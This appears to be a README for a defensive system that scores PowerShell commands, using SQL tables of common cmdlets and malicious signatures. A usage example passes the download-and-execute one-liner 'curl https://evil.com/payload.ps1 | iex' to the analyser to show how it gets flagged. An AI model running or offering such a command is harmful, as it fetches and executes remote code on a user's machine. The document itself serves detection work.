# PowerShell Common Cmdlets Detection System

## Overview
This system implements concurrent detection of PowerShell commands, where a single command can be flagged as both legitimate (common cmdlet) and potentially suspicious simultaneously.

## Key Concepts

### 1. Concurrent Detection
- **Common cmdlets** (0.1 base score) and **malicious signatures** (higher scores) are detected independently
- A command like `iex malicious-payload` will trigger:
  - Common cmdlet detection: `iex` (Invoke-Expression) = 0.1 points
  - Malicious pattern detection: base64/suspicious content = higher score
- **Total risk score** = sum of all detections

### 2. Database Tables

#### powershell_cmdlets
- Contains all common PowerShell cmdlets and their aliases
- Each entry has a base score of 0.1
- Includes both full cmdlet names and common aliases
- **Purpose**: Establish baseline legitimate command usage

#### powershell_signatures
- Contains malicious/suspicious PowerShell patterns
- Higher base scores (5.0 - 9.7) based on threat level
- **Purpose**: Detect potentially malicious activities

## Benefits

### 1. Context-Aware Analysis
```sql
-- Example: Legitimate admin command
SELECT * FROM analyze_powershell_command_comprehensive('Get-Process notepad');
-- Result: Only cmdlet detection, low risk score

-- Example: Suspicious command with common cmdlet
SELECT * FROM analyze_powershell_command_comprehensive('iex (base64-encoded-payload)');
-- Result: Both cmdlet (0.1) + malicious pattern (5.0+) = higher total risk
```

### 2. Reduced False Positives
- Common administrative tasks won't be flagged as high-risk
- Legitimate PowerShell usage is acknowledged
- Focus on truly suspicious combinations

### 3. Enhanced Detection Accuracy
- Distinguishes between normal cmdlet usage and suspicious context
- Provides granular analysis with detailed breakdowns
- Enables risk-based alerting and response

## Usage Examples

### Basic Cmdlet Check
```sql
SELECT * FROM check_common_cmdlet('ls');
-- Returns: is_common=true, score=0.1, cmdlet_name='Get-ChildItem'
```

### Comprehensive Analysis
```sql
SELECT * FROM analyze_powershell_command_comprehensive('curl https://evil.com/payload.ps1 | iex');
-- Returns:
-- - signature_matches: Web client patterns (7.5) + Invoke-Expression (5.0)
-- - cmdlet_info: curl (0.1) + iex (0.1)
-- - total_risk_score: 12.7
-- - has_suspicious_patterns: true
-- - has_common_cmdlets: true
```

## Command Categories

### Low Risk (0.1 - 2.0)
- Pure administrative commands: `Get-Process`, `ls`, `cd`
- Basic file operations: `cat`, `copy`, `move`
- Information gathering: `Get-Service`, `Get-Location`

### Medium Risk (2.1 - 7.0)
- Common cmdlets with suspicious patterns
- Network operations in certain contexts
- Mixed legitimate/suspicious content

### High Risk (7.1+)
- Malicious patterns with or without common cmdlets
- Security bypass attempts
- Advanced persistent threat indicators

## Implementation Notes

### Frontend Integration
The system returns structured JSON data that can be easily consumed by web applications:

```javascript
// Frontend can process both aspects
const result = await analyzeCommand(command);
console.log('Legitimate cmdlets found:', result.has_common_cmdlets);
console.log('Suspicious patterns found:', result.has_suspicious_patterns);
console.log('Total risk:', result.total_risk_score);
```

### Alerting Logic
```
if (total_risk_score > 7.0 && has_suspicious_patterns) {
    alert = "HIGH_RISK";
} else if (has_suspicious_patterns && !has_common_cmdlets) {
    alert = "MEDIUM_RISK";
} else if (has_common_cmdlets && total_risk_score < 2.0) {
    alert = "LOW_RISK";
}
```

## Maintenance

### Adding New Cmdlets
```sql
INSERT INTO powershell_cmdlets (alias, cmdlet_name, description) 
VALUES ('new-alias', 'New-Cmdlet', 'Description of new cmdlet');
```

### Updating Risk Scores
The 0.1 base score for cmdlets is intentionally low to:
- Acknowledge legitimate usage
- Not overshadow actual threat indicators
- Maintain proportional risk assessment

## Testing
Use the provided `test_concurrent_detection.sql` file to verify:
- Pure cmdlet detection works correctly
- Malicious pattern detection remains effective
- Concurrent detection provides accurate combined scores
- Different command combinations produce expected results
